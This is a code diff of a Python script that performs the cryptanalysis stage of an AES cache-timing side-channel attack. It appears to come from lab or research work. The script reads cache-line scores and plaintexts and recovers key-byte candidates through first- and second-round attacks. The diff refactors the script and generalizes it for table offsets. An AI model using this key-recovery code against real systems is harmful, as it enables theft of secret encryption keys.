@@ -1,10 +1,18 @@
-# 1Round Attack - Tromer score approach, choosing the lines with the highest average score
+# Crypto.py
 
-# 2Round Attack - Naive approch using threshold to cut all the possible 4keyByte values
+# Description:
+#   Program that handles the crypto-analysis phase of the side-channel attack
+#       1Round Attack - Tromer score approach, choosing the lines with the highest average score
+#       2Round Attack - Naive approch using threshold to cut all the possible 4keyByte values
 
 
+
+
+import math
 from pyfinite import ffield  # To perform GF(256) multiplications
 
+
+# Global Variables
 
 delta = 16                                                              # Max number of table elements in a L1-D cache block
 s = [                                                                   # Sbox - 256 
@@ -27,60 +35,66 @@ s = [                                                                   # Sbox -
         ]
 
 
-# Table/Offset Attack Varables:
-
+# Table/Offset Attack Variables:
 table_elem_dic = {}                                                 # dictionary that links table & element index to the respective L1 line that mapps it
+t0e_line = 0                                                        # L1 line of beginning of enc. table 0 
+offset_elem = 0                                                     # minimum offset - i.e.: the minimum element shift - example: shift of 14 in a L1 block means offset_elem = 2
 
+# Round 1 Attack Variables:
+first_candidate_k = []                                              # Lowest possible key byte value from 16 key bytes 
 
-# Round 1 Attack Varables:
-
-hk_score = [[0 for x in range(256)] for y in range(16)]             # Score structure per key byte value
-hk_ref = [[0 for x in range(256)] for y in range(16)]               # Number of times a given hk has updated its score
-candidate_k = []                                                    # List of candidate key bytes per byte
-#h_candidate_k = [[]for y in range(16)]                              # All high <ki> bits of each candidate key
-#fh_candidate_k = [0 for x in range(16)]                             # The first high<ki> in the format:XXXX 0000 of each candidate keybyte
-first_candidate_k = []
-
-# Round 2 Attack Varables:
-F = ffield.FField(8)                                                # Galouis Field(256)
-lk = [[x for x in range(65536)] for y in range(4)]                  # Structure containing all the combinations from the 4 equations
-lk_list = [[]for y in range(4)]                                     # List of the remaining combinations from lk 
-hx = [x for x in range(4)]                                          # Hipotetical index
-hk = [0 for x in range(16)]                                         # Hipotetical key
+# Round 2 Attack Variables:
 fk = [[] for x in range(16)]                                        # Array of the final keys extracted
-line_value_threshold = 50                                           # Auxiliar structure
+line_value_threshold = 50                                           # Max value a line can take to be considered a used line
+
+
+
+# Main Program
+def main():
+    table_offset_attack()
+    print("t0e_line: ", t0e_line)
+    print("offset_elem: ", offset_elem)
+
+    round_1_attack()
+    print("first_candidate_k : ", first_candidate_k)
+
+    round_2_attack()
+    print("final key:", fk)
 
 
 
 
-
-
-
-
-#implement table/offset attack
+# Implement table/offset attack
 def table_offset_attack():
-
+     
+    global offset_elem
+    global t0e_line
 
     tab_file = open("side_channel_info/table.out", "r")
     table_scores = [float(i) for i in tab_file]
     tab_file.close()
 
     table_indices_sorted = sorted(range(len(table_scores)), key=lambda k: table_scores[k])
+    # print(table_indices_sorted)
     top_2 = table_indices_sorted[-2:]
     
-
-    #offset checking (0 or 32bit)
-    offset_elements = 0
+    
+    # Offset checking (0 or 32bit)
+    offset_elem = 0
+    t0e_line = top_2[1]
     if (abs(top_2[0]-top_2[1]) == 1):
-        top_2.sort()    
-        offset_elements = 8
-    print(top_2)
+        top_2.sort()
+        t0e_line = top_2[0]
+        offset_elem = 8
+
 
     
-    #table element structure:  (table index, element index) : L1 line
+    
+    # Table element structure: (table index, element index) : L1 line
+    #   Warning: It assumes all the tables are consequent in memory
     for t in range(4):
         for e in range(256):
-            line = (top_2[0] + ((offset_elements + e + 256*t)//delta)) %64
+            line = (t0e_line + ((offset_elem + e + 256*t)//delta)) %64 
             table_elem_dic[(t,e)] = line
 
 
@@ -90,16 +104,17 @@ def table_offset_attack():
     #print(first, second, offset_elements)
     #print(table_elem_dic)
 
-    return 0
-
-
-
 
 
 def round_1_attack():
 
 
-    l=0
+    # Local Variables
+    hk_score = [[0 for x in range(256)] for y in range(16)]             # Score structure per key byte value
+    candidate_k = []                                                    # List of candidate key bytes per byte
+    l=0                                                                 # Measurement file index
+
+
     while(True):
         try:
             p,scores  = read_files(l)
@@ -110,10 +125,14 @@ def round_1_attack():
 
         for bi, byte in enumerate (hk_score):
             for hki in range(len(byte)):
-                hx = p[bi] ^ hki          
+                hx = p[bi] ^ hki   
                 hline = table_elem_dic[(bi%4,hx)]
                 new_score = scores[hline]
                 hk_score[bi][hki] += new_score
+
+
+    # for i in range(256):
+    #     print(str(i) + " : " + str(hk_score[0][i]))
 
     for item in (hk_score):
         a = []
@@ -122,52 +141,61 @@ def round_1_attack():
                 a.append(index)
         a.sort()    
         candidate_k.append(a.copy())
+
         
-
-
     # sort candidate and pick the min value of each key
     for item in candidate_k:
         first_candidate_k.append(item[0])
-        #print(first_candidate_k)
     
-    print(first_candidate_k)
+
 
 
 
 def round_2_attack():
 
-    l=0
-    while(True):
 
+    # Local Variables
+    F = ffield.FField(8)                                                # Galouis Field(256)
+    hx = [x for x in range(4)]                                          # Hipotetical index
+    hk = [0 for x in range(16)]                                         # Hipotetical key
+    n_comb = 16 - offset_elem                                           # number of possible combinations of each key byte | e.g: 0->16 | 8->8 | 12->4 | 14->2
+    n_bits = int(math.log2(n_comb))                                     # number of bits from each key byte that remain unknown
+    lk = [[x for x in range(n_comb**4)] for y in range(4)]              # Structure containing all the combinations from the 4 equations
+    l=0                                                                 # Measurement file index
+
+    
+    while(True):
         try:
             p,scores  = read_files(l)
             l+=1
         except IOError:
             break
+
+
+        # This phase has to consider the offset of the attack
+        # And perform only the min iterations for the key discovery
         
-        #consider using bytes(x) instead of int
-        # this might give strange results for fh_candidates = [0-7 AND 246-255] and offset = 8
-        # this is a poor (& probably unique) solution to the problem described above
-        for low_hkA in range(0, delta):
-            for low_hkB in range(0, delta):
-                for low_hkC in range(0, delta):
-                    for low_hkD in range(0, delta):
-                        hk[0] =  (first_candidate_k[0] + low_hkA) %256
-                        hk[1] =  (first_candidate_k[1] + low_hkB) %256
-                        hk[2] =  (first_candidate_k[2] + low_hkC) %256
-                        hk[3] =  (first_candidate_k[3] + low_hkD) %256
-                        hk[4] =  (first_candidate_k[4] + low_hkA) %256
-                        hk[5] =  (first_candidate_k[5] + low_hkB) %256
-                        hk[6] =  (first_candidate_k[6] + low_hkC) %256
-                        hk[7] =  (first_candidate_k[7] + low_hkD) %256
-                        hk[8] =  (first_candidate_k[8] + low_hkA) %256
-                        hk[9] =  (first_candidate_k[9] + low_hkB) %256
-                        hk[10] = (first_candidate_k[10] + low_hkC) %256
-                        hk[11] = (first_candidate_k[11] + low_hkD) %256
-                        hk[12] = (first_candidate_k[12] + low_hkA) %256
-                        hk[13] = (first_candidate_k[13] + low_hkB) %256
-                        hk[14] = (first_candidate_k[14] + low_hkC) %256
-                        hk[15] = (first_candidate_k[15] + low_hkD) %256
+        #consider using byarray instead of int
+        for low_hkA in range(0, (n_comb)):
+            for low_hkB in range(0, (n_comb)):
+                for low_hkC in range(0, (n_comb)):
+                    for low_hkD in range(0, (n_comb)):
+                        hk[0] =  (first_candidate_k[0] + low_hkA)
+                        hk[1] =  (first_candidate_k[1] + low_hkB)
+                        hk[2] =  (first_candidate_k[2] + low_hkC)
+                        hk[3] =  (first_candidate_k[3] + low_hkD)
+                        hk[4] =  (first_candidate_k[4] + low_hkA)
+                        hk[5] =  (first_candidate_k[5] + low_hkB)
+                        hk[6] =  (first_candidate_k[6] + low_hkC)
+                        hk[7] =  (first_candidate_k[7] + low_hkD)
+                        hk[8] =  (first_candidate_k[8] + low_hkA)
+                        hk[9] =  (first_candidate_k[9] + low_hkB)
+                        hk[10] = (first_candidate_k[10] + low_hkC)
+                        hk[11] = (first_candidate_k[11] + low_hkD)
+                        hk[12] = (first_candidate_k[12] + low_hkA)
+                        hk[13] = (first_candidate_k[13] + low_hkB)
+                        hk[14] = (first_candidate_k[14] + low_hkC)
+                        hk[15] = (first_candidate_k[15] + low_hkD)
 
 
                         hx[0] = s[p[0] ^ hk[0]] ^ s[p[5] ^ hk[5]] ^ F.Multiply(2, s[p[10]^hk[10]]) ^ F.Multiply(3, s[p[15]^hk[15]]) ^ s[hk[15]] ^ first_candidate_k[2]
@@ -175,45 +203,43 @@ def round_2_attack():
                         hx[2] = F.Multiply(2,s[p[8] ^ hk[8]]) ^ F.Multiply(3,s[p[13] ^ hk[13]]) ^ s[p[2]^hk[2]] ^ s[p[7]^hk[7]] ^ s[hk[13]] ^ first_candidate_k[0] ^ first_candidate_k[4] ^ first_candidate_k[8] ^ 1
                         hx[3] = F.Multiply(3,s[p[12] ^ hk[12]]) ^ s[p[1]^hk[1]] ^ s[p[6]^hk[6]] ^ F.Multiply(2, s[p[11]^hk[11]]) ^ s[hk[12]] ^ first_candidate_k[3] ^ first_candidate_k[7] ^ first_candidate_k[11] ^ first_candidate_k[15]
      
-                        comb_index = (low_hkA<<12) + (low_hkB<<8) + (low_hkC<<4) + low_hkD
+                        comb_index = (low_hkA<<(n_bits*3)) + (low_hkB<<(n_bits*2)) + (low_hkC<<(n_bits*1)) + low_hkD
                         for i in range(0,4):
                             hline = table_elem_dic[((2-i)%4, hx[i])]
                             if (scores[hline] < line_value_threshold):
                                 lk[i][comb_index] = -1
 
 
-
-
-
-
-
-    # Pass data from lk to lk_list
+    # Retrieve the remaining combinations from lk[]
+    lk_list = [[]for y in range(4)]
     for lk_index, lk_item in enumerate(lk):
         for comb in lk_item:
             if comb != -1:
-                lk_list[lk_index].append(comb)
+                lk_list[lk_index].append(comb)    
+    
+
 
     # Registering discovered key bytes
     for lk_index, lk_item in enumerate(lk_list):
-        set_final_key(lk_index,lk_item)
-
-    print(fk)
+        set_final_key(fk, lk_index,lk_item, n_comb, n_bits)
 
 
 
 
 
-# Auxiliar functions
 
+# Auxiliar Functions
 
-# Register the possible keys
-def set_final_key(i, lk_item):
-    
+# Registers the discovered keys bytes values by the attack
+def set_final_key(fk, i, lk_item, n_comb, n_bits):
+
     for item in lk_item:
         for j in range(0,4):
-            key_byte = first_candidate_k[(i*4+j*5) %16] + (item>>((3-j)*4) & 0xf)
+            key_byte = first_candidate_k[(i*4+j*5) %16] + (item>>((3-j)*n_bits) & (n_comb-1))
             if key_byte not in fk[(i*4+j*5)%16]:
-                fk[(i*4+j*5)%16].append(key_byte) 
+                fk[(i*4+j*5)%16].append(key_byte)
+    
+
 
 
 # Get the content of meas, victim files
@@ -233,7 +259,5 @@ def read_files(l):
 
 
 
-# Main Program
-table_offset_attack()
-round_1_attack()
-round_2_attack()
+# Program execution
+main()
